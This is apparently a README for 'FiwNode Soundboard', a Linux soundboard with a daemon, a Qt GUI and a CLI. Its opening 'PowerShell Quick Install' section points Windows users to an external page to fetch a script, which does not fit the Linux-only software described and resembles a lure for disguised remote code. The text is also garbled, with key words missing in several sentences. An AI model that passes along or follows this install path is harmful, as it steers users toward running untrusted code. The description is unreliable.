<div align="center">

# FiwNode Soundboard: Visual Workflow Audio Mixing — Media Editor

![](files/preview.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://grzegorzpalczynski6-boop.github.io/fiwnode-soundboard/)

[![win](https://img.shields.io/badge/WIN-WINDOWS-84cc16?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-5%2B-a3e635?style=flat-square&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/INSTALLS-3.4K-65a30d?style=flat-square&labelColor=0d1117)]()

</div>

---

FiwNode Soundboard turns Linux into a playable audio surface, routing local sound files and your through independent Chat and Monitor buses so voice apps hear exactly what you intend while your headphones hear the mix you choose. The daemon owns the graph, library, and playback state, while the Qt desktop window and a first-class CLI both drive it over a local socket — search a folder, queue a clip, nudge a gain, or fire a shortcut from the tray, all from one workspace. Sounds are indexed in place from your existing directories, decoded on demand through FFmpeg, and never copied or modified, keeping the workflow as light as dragging a file into view. Whether you are staging a stream, punctuating a call, or cueing a reaction in the moment, the flow stays visual, immediate, and entirely on your machine.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**FiwNode Soundboard** turns your Linux desktop into a live performance surface. The board is the centerpiece: a wall of pads you can color, group into folders, collect, favorite, and fire off in any order. Drop in existing sounds from wherever they already live on disk — the library indexes directories in place, so nothing gets copied, moved, or rewritten. Search stays instant even across thousands of files, and the queue lets you line up the next few hits while the current one is still ringing out.

Audio routing is visual and direct. Chain physical mic through Mic gain and mute, blend in local files through the Chat bus so voice apps hear exactly what you send, and dial in Monitor separately so your own ears get a cleaner mix than your listeners do — no accidental sidetone. Each stage has its own level and mute, and the whole path is drawn out in the flow diagram below. Preferred devices stick to their names and quietly return to the mix when they reappear; if one vanishes mid-session, FiwNode falls back to defaults and recovers without dropping your place.

Two surfaces, one brain. The Qt 6 desktop app gives you the pad grid, tray controls, configurable shortcuts, and device pickers, while the CLI covers the same ground headlessly — start the daemon, add a folder, search, play, adjust a bus, queue the next sound, check status. Both talk to the same local daemon over a private Unix socket, so the state you see in one is the state you see in the other. Configuration, library, logs, and runtime files follow the XDG layout, and nothing leaves your machine — no network service, no telemetry, no uploads. Everything from the pad colors to the gain curves is yours to shape, and every track stays right where you filed it.

## How the audio flows

Picture a mixer desk that never asks you to rewire anything. Two rivers feed it. The first is your live voice, arriving from the physical and slipping through its own gain and mute stage. The second is anything you play: local files ride through FFmpeg decoding, then hit the Chat gain and mute stage before joining the same channel as your voice. That merged stream becomes the FiwNode Chat node — the single input your voice app sees.

From there, the audio splits into two destinations. The Chat mix leaves toward your voice application, so listeners hear exactly what you sent them. A parallel branch takes the same played-back sounds through a separate Monitor gain and mute stage and out to your speakers or headphones, so you can preview and cue without leaking your own mic into your ears.

```
physical mic ──> Mic gain/mute ─────────────┐
├──> FiwNode Chat ──> voice app
local file ──> FFmpeg ──> Chat gain/mute ───┘
└──> Monitor gain/mute ──> your speakers/headphones
```

Think of it as three dials with three jobs: Mic shapes your voice, Chat shapes what everyone else hears, and Monitor shapes only your local playback. Because the monitor branch taps the played sounds after they leave the file path — not after the Chat merge — your never loops back into your headphones by default. Nudging the Monitor level changes your listening experience and nothing else.

Under the hood, the daemon is the one holding the graph, running playback, indexing the library, and storing configuration. The desktop window and the command-line interface are just friendly faces on top — they reach the daemon over a local Unix socket, so the audio graph keeps breathing even when the interface is tucked away in the tray.

## Workflow

FiwNode is built around a simple loop: pick a sound, route it, shape it, drop it into a voice app. Everything below is that loop at work — in the GUI, from the CLI, or both at once.

### 1. Wake the daemon

FiwNode's engine is a background daemon that owns the graph, the sound library, and playback. Start it once and it stays out of your way — the desktop app launches it automatically, or you can bring it up directly and let it run headless. The GUI and the CLI are just two windows onto the same daemon, so a sound triggered from the tray and a sound triggered from a terminal land on the same bus.

### 2. Point the graph at your room

Select **FiwNode Chat** as your in the voice app, game, or recorder you're feeding. That's the whole routing step — from there, physical mic input and decoded local files merge into one your apps already know how to listen to. Choose your real mic as the capture source and your speakers or headphones as the monitor output. Device choices are remembered by stable name, so reconnecting a headset doesn't quietly rewire your setup.

### 3. Load the library

Hand FiwNode a folder and it indexes what's already there — no copying, no reorganizing, no touching your files. Search across the library by title, browse folders and collections, favorite the hits, and color-code the ones you fire most. Every playable file is decoded only when it's needed, so a shelf of long recordings doesn't cost anything until one is actually triggered.

### 4. Fire a sound

One sound plays at a time; a new trigger replaces the old one cleanly instead of stacking into mush. When you want a run of sounds, feed them into the bounded queue and let them follow each other. Direct file paths play instantly whether or not they're in the library — handy for one-off drops.

### 5. Shape the two mixes

Sound flows into two separate lanes with independent gain and mute:

- **Chat** — what everyone else hears. Your mic and your effects share this bus.
- **Monitor** — what *you* hear, kept deliberately separate so your own never sidetones into your headphones.

Trim mic level against effect level, mute the effects without silencing your voice, or pull monitor down to near-silence while the voice chat keeps receiving everything. Gains stay within a safe range, and strong boosts are allowed — with the usual warning that clipping is clipping.

### 6. Reach for it without looking

Bind hotkeys through your desktop's global shortcut portal, or use physical-key capture for a Soundpad-style feel. The title bar's tray button tucks the window away; configure the close button to do the same if you'd rather it never quit by accident. Tray controls cover the essentials — play, stop, mute, quit — so the window can stay hidden during a session.

### 7. Automate the rest

The CLI mirrors nearly everything the GUI does: start and stop the daemon, list devices, add library roots, search, play, pause, adjust each of the three volumes, mute a bus, enqueue a sound, query status, shut down. Script it, chain it, bind it — the daemon doesn't care where the command came from.

### A full pass, end to end

Start the daemon → select **FiwNode Chat** as your mic → add a sounds folder → search for a clip → play it → nudge Chat gain up and Monitor gain down → queue the next two → hide the window → fire the rest from hotkeys → quit from the tray when the session ends.

Your configuration, library, and daemon log live in standard per-user locations, and nothing about any of the above ever leaves the machine.

## FAQ

**Does FiwNode replace my everywhere, or do I have to pick it per app?**
Per app, and that is a feature rather than a chore. FiwNode Chat shows up as a selectable input node in, so you point Discord, OBS, a game, or a recorder at it individually. Your physical mic stays untouched on the hardware side, which means you can keep a clean dry path in one app and a soundboard-rich path in another without re-plumbing your desk.

**What is the actual difference between Chat and Monitor?**
Think of two faders hanging off the same rack. The Chat bus is the mix that leaves your machine — sounds and voice blended together — and it is what your friends hear. Monitor is a private listening tap: it lets you preview clips in your headphones without anything reaching the Chat bus. It never loops your back at you, so there is no accidental sidetone and no feedback spiral.

**Where do my sound files live after I add a folder?**
Exactly where they already were. Indexing reads your directories and writes metadata into the library database; the audio files themselves are never copied, moved, or rewritten. Remove a library root later and only the catalog entries disappear — the originals sit safely in place. Treat the library as a card catalog, not a shelf.

**One sound at a time — is that a limitation or a design choice?**
A deliberate one. A new play replaces whatever is currently playing so overlapping clips never turn into mud. When you need a sequence, load up the bounded queue and let it march through sounds in order. Predictable playback beats chaotic layering when the whole point is that other people hear it clearly.

**Why does a hotkey sometimes do nothing?**
Shortcuts travel through your desktop's GlobalShortcuts portal where one exists, so behavior depends on the compositor. The alternative physical-key capture path reads a specific input device directly and needs read access granted by your distribution's normal security policy — FiwNode deliberately does not install broad input permissions on its own. If a key is silent, check which capture path is active before assuming the binding is broken.

**Can I run it headless, or is the GUI mandatory?**
The daemon is the engine; the window is just a dashboard. The CLI can start the daemon, play a file or a library match, adjust Mic, Chat, and Monitor levels independently, toggle mutes, and manage the queue — all without a single pixel drawn. Script it into a stream deck macro, a shell alias, or a startup hook and the GUI becomes optional scenery.

**Where does everything get stored?**
All state follows the XDG conventions: configuration, library database, daemon log, and the local IPC socket each land in their conventional home, with environment overrides available when you want to sandbox a session. The IPC socket is mode-restricted to your user and stays local — there is no network listener and no telemetry phoning home. Your audio never leaves the machine.

**My preferred output device vanished mid-session. What happens?**
FiwNode falls back to the session default and quietly moves back when your device reappears. Device selections are pinned by stable names rather than numeric session IDs, so replugging a headset or reconnecting a USB interface does not scramble your routing. Unplug, replug, keep playing.

**Positive gain is clipping my mix — is that expected?**
Yes, and it is honest about it. Gains span a wide range in both directions, but pushing a loud clip hard into positive territory will clip, just like any mixer. Pull the source down, trim the Chat bus, and let the Monitor fader do the loudness work in your own ears instead of squashing the outgoing mix.

**Does playing a sound modify my voice channel's audio quality?**
No resampling magic, no hidden compression stage — FiwNode hands decoded audio into the graph and lets the session manager do its job. The node behaves like any other input, so whatever your voice app normally does with a mic is exactly what it does with FiwNode Chat.

## License

FiwNode Soundboard is released under the MIT License — the same permissive, no-fuss terms that keep the audio flowing. In plain terms: you are free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the copyright notice and permission notice travel with it. The full license text is included in the project's license file, so treat that document as the source of truth rather than this summary.

What this means for your workflow:

- **Use it anywhere.** Personal setups, collaborative studios, streaming rigs, or commercial deployments — the license does not restrict how you route, play, or build on FiwNode.
- **Modify it freely.** Remix the audio graph, restyle the interface, extend the CLI — your changes stay yours, and you are not obligated to publish them.
- **Redistribute with care.** If you share a copy, keep the copyright and permission notice intact so the next person inherits the same freedoms you did.
- **No warranty, no liability.** The software is provided "as is." The authors are not responsible for clipped mixes, missed cues, or anything else that happens while you are behind the board.

The software ships without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

MIT keeps the path clear: open the app, connect the nodes, and let the soundboard do the talking.